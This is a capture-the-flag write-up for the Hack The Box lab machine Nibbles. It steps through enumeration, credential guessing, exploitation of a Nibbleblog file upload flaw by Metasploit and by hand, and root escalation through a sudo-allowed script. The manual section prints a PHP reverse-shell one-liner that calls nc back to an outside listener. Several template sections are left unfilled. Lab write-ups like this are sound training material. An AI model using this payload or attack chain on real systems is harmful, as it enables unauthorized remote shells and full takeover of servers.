# Nibbles - HTB

Nibbles - 10.10.10.75

![](/images/nibbles/1. nibbles "Nibbles Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Broad introduction to the machine.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Summary paragraph.

-1- nmap

-2- 

-3- 

-4- 

-5- 

-6- 

-7- 

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================


→ nmap -A -T4 10.10.10.75

![](/images/nibbles/2. nmap)


→ Browse to the website:



→ View page source because this is rather bland:



→ Okay, here we have a comment in the code...let's check out http://10.10.10.75/nibbleblog/



→ Okay we have some sort of an application here. It looks like a blog (based on the name, and features).  In the lower right we see “Powered by Nibbleblog” so let's searchsploit for that:
   ⇒ searchsploit nibbleblog



→ So there is a remote Arbitrary File Upload for Nibbleblog 4.0.3, and a Metasploit module for it.  Let's load the module and see what else we can learn:
   ⇒ msfconsole
   ⇒ search nibble
   ⇒ use 0



→ Now let's show some info:
   ⇒ info



→ So the exploit requires valid credentials ("authenticated remote attacker"). So we need to enumerate and look for valid creds. This also means there is likely a login portal or app that we should be able to find to use the creds on.
→ We'll fire up DirBuster
   ⇒ Set your options as shown below and hit Start:



→ On the results tab you will start to see a lot of info pour in:



→ Here we see /nibbleblog/admin.php
→ Anytime we see an “admin” or “login” or “manager” file, these are of interest.  Let's browse to it:
   ⇒ http://10.10.10.75/nibbleblog/admin.php



→ And here's our login panel we thought we'd find.  Maybe there are default credentials?
   ⇒ Google “nibbleblog default credentials”
   ⇒ Unfortunately, nothing useful comes up. Looks like it doesn't have a default password.  So we are stuck guessing or brute forcing.

→ In our dirbuster enum, we saw another directory: nibbleblog/content
   ⇒ Maybe we can browse there and find some credentials?



→ Let's try the private/ sub-directory:



→ Okay, maybe a list of users?



→ Okay, we have a username, “admin”
   ⇒ Now what for a password?  Unfortunately, none of the other files seem to shed any light.  Let's try brute forcing
   ⇒ admin:nibbles



→ And we're in!  Turns out the password “nibbles” was right in front of us several times throughout.
→ Now let's search for a version to confirm whether or not we can use our Metasploit module:
→ In the above screenshot there is a Settings page on the left side, click it.



→ If you scroll down on the Settings page you will eventually see the above.  Version is 4.0.3 which means our Metasploit module should work. Let's give it a shot.


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================


→ Fire up msfconsole again
   ⇒ use exploit/multi/http/nibbleblog_file_upload
   ⇒ set USERNAME admin
   ⇒ set PASSWORD nibbles
   ⇒ set RHOSTS 10.10.10.75
   ⇒ set TARGETURI /nibbleblog
   ⇒ show options



→ All of our options look set properly.  Let's give this a try:
   ⇒ run



→ And we have a meterpreter shell!  If your exploit stalls at the “[+] Deleted image.php” step, don't worry. Just give it a moment and your meterpreter prompt should appear.
→ Now for some enum:
   ⇒ getuid
   ⇒ sysinfo



→ 64-bit Ubuntu Linux, 4.4.0-104-generic kernel
→ We are user “nibbler”

→ We need to privesc, but first let's drop into an actual linux shell on the box:
   ⇒ shell
   ⇒ pwd



→ Okay, so we are low-privileged user “nibbler” so let's start by going to our home folder:
   ⇒ cd /home/nibbler
   ⇒ ls -la



→ Okay so ignore anything that has a date of May 5 here as others were working on the box and didn't clean up after themselves.
→ We do see user.txt here so let's grab that flag:
   ⇒ cat user.txt



→ There's nothing in .bash_history, and the personal.zip looks interesting so let's check it out.
   ⇒ unzip personal.zip



→ Let's see what permissions we have to monitor.sh:
   ⇒ ls -la personal/stuff



→ Okay so we own the file and can read/write/execute it at will.  When you cat it though, the current contents are no help.

→ Now, let's check a quick “sudo -l” before we start uploading any scripts of our own.



→ And we can run the monitor.sh command root!  Now all we need to do is replace it's current contents with something that will give us a shell...something simple like:
   ⇒ bash -i

→ echo “bash -i” > persona/stuff/monitor.sh

→ sudo personal/stuff/monitor.sh



→ Success! We are root.  Let's go get our root flag:
   ⇒ cat /root/root.txt



→ And we have our flags.





<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================


→ So we have the credentials from our enumeration:  admin:nibbles
→ We are going to manually exploit the same vulnerability that the metasploit module exploits, but uploading a malicious php file.



→ Back on the Dashboard of the admin login, we see a “Plugins” section on the left side.  Click it.
→ Under the My Image plugin, click Configure




→ Here we can upload a maclicious php file to gain a reverse shell.  We can look-up php one-liners and then create a php file to do what we need:
   ⇒ <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 17011 >/tmp/f"); ?>



→ Create a .php file (call-back.php in my case) and put the above code into it.  Save it and then use the nibbleblog myimage plugin to upload it.
→ Set up your nc listener in a Kali terminal window:
   ⇒ nc -lvnp 17011



→ Then navigate to the following:  http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
→ In your nc listener window you should see:



→ Success!  We have a shell.  Now for enum.
   ⇒ whoami



→ So we are user nibbler, let's go to our /home/nibbler folder
   ⇒ cd /home/nibbler



→ Here we can grab the user flag:
   ⇒ cat user.txt



→ personal.zip looks interesting. let's extract it:
   ⇒ unzip personal.zip
   ⇒ ls personal/stuff/monitor.sh



→ So here we have monitor.sh that we can edit and execute.  Now let's check sudo permissions.
   ⇒ sudo -l



→ So we can run monitor.sh as root!  You can edit the script to just give an interactive bash shell:
   ⇒ echo “bash -i” > personal/stuff/monitor.sh
   ⇒ cat personal/stuff/monitor.sh



→ Now let's run it!
   ⇒ sudo personal/stuff/monitor.sh



→ Success!  Let's go get our root flag:
   ⇒ cat /root/root.txt



→ And here we have our flags.


<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

<file-name.py/.sh>

    insert code here
    # code blocks ignore the rest of markdown formatting
    # so you can leave # characters to denote comments
    # without setting new headings
        

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. Link: []()
2. Link: []()
3. Link: []()
4. Link: []()
5. Link: []()

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
